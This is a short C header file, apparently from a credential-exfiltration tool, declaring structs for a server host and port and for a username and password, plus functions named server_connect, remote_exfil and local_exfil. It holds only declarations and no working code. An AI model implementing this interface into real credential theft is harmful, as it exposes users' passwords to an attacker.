#ifndef CIPHER_EXFIL_H
#define CIPHER_EXFIL_H

struct serv_info {
    const char *host;
    const int port;
};

struct user {
    char* username;
    char* password;
};

int server_connect();
int remote_exfil(int socket_fd, const struct user *user);
int local_exfil(struct user *user);

#endif //CIPHER_EXFIL_H
